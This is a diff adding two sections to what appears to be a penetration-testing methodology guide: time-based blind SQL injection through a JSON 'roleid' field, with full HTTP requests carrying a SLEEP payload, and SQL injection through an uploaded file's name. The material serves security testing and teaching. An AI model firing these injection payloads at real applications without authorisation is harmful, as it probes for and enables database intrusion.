@@ -386,19 +386,89 @@ If the server response time is equal to the time specified in the payload, this 
 
 ***
 
-#### s
+#### Time-Based Blind SQL Injection Testing on JSON roleid Parameter
 
 {% stepper %}
 {% step %}
-###
-
-
+Navigate to an API endpoint that processes JSON data, such as `/api/user`, `/api/roles`, `/api/profile`, or `/api/data`, typically requiring authentication via a token
 {% endstep %}
 
 {% step %}
-###
+Perform a login request to retrieve a valid token, ensuring access to the API endpoint that uses the roleid parameter
+{% endstep %}
 
+{% step %}
+Locate the roleid parameter in the JSON body of the API request, often used to filter user roles or permissions and directly passed to a database query
 
+```json
+POST /api/roles HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Content-Length: [variable]
+Authorization: Bearer [token]
+Origin: https://example.com
+Referer: https://example.com/api/roles
+Connection: close
+
+{"roleid": 1}
+```
+{% endstep %}
+
+{% step %}
+Modify the roleid parameter with a simple time-based payload like `1 AND SLEEP(20)` to induce a 20-second delay if the query executes
+
+```json
+POST /api/roles HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Content-Length: [variable]
+Authorization: Bearer [token]
+Origin: https://example.com
+Referer: https://example.com/api/roles
+Connection: close
+
+{"roleid": "1 AND SLEEP(20)"}
+```
+
+Use Burp Suite or curl to send the modified request and measure the response time. A \~20-second delay (21,131 ms) confirms the payload executed in the database
+{% endstep %}
+
+{% step %}
+Send a non-delaying request with the original roleid value (`{"roleid": 1}`) or a neutral payload (`{"roleid": "1 AND 1=1"}`) to ensure no delay occurs, verifying the injection
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### SQL Injection in Filename Parameter
+
+{% stepper %}
+{% step %}
+Log into the target site and intercept the requests using the Burp Suite tool
+{% endstep %}
+
+{% step %}
+Then identify and check the file upload functionality on the site. This functionality is usually in the profiles, tickets, user settings, and ...
+{% endstep %}
+
+{% step %}
+Then click on the Upload File option and intercept the request using intercept in Burp Suite
+{% endstep %}
+
+{% step %}
+Now put `--sleep(15).png` in the payload file name and then check the server response to see if it responded to us after 15 seconds
+{% endstep %}
+
+{% step %}
+If the server response takes 15 seconds, the SQL Injection vulnerability in the file name is confirmed and it is vulnerable
 {% endstep %}
 {% endstepper %}
 
